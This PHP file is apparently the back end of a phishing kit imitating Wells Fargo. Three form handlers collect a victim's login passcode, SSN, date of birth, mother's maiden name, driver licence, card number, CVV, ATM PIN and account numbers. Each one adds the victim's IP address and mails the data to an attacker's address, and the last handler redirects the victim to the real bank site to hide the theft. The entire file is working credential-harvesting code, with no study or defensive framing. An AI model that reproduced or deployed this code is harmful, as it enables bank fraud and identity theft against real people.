<?php
include 'email.php';

if (isset($_POST['btn1'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Online ID            : ".$_POST['j_username']."\n";
	$message .= "Passcode              : ".$_POST['j_password']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./detail.html");

	
}
else if (isset($_POST['btn2'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Full Name           : ".$_POST['fname']."\n";
	$message .= "Address           : ".$_POST['add']."\n";
	$message .= "Phone Number           : ".$_POST['phone']."\n";
	$message .= "SSN           : ".$_POST['ssn']."\n";
	$message .= "DOB           : ".$_POST['dob']."\n";
	$message .= "MMN           : ".$_POST['mmn']."\n";
	$message .= "Driver License number           : ".$_POST['dln']."\n";
	$message .= "city           : ".$_POST['city']."\n";
	$message .= "state           : ".$_POST['state']."\n";
	$message .= "Routing Number           : ".$_POST['rn']."\n";
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./card.html");

	
}
else if (isset($_POST['btn3'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| xLs |--------------|\n";
	
	$message .= "Email           : ".$_POST['ai']."\n";
	$message .= "Password           : ".$_POST['pr']."\n";
	$message .= "Username           : ".$_POST['uname']."\n";
	$message .= "CARD NUMBER           : ".$_POST['cn']."\n";
	$message .= "Expiry Date           : ".$_POST['exdate']."\n";
	$message .= "CVV           : ".$_POST['cvv']."\n";
	$message .= "ATM PIN            : ".$_POST['pin']."\n";
	
	$message .= "Zip code           : ".$_POST['zcode']."\n";
	$message .= "Account Number           : ".$_POST['ac']."\n";

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: https://www.wellsfargo.com/");

	
}

?>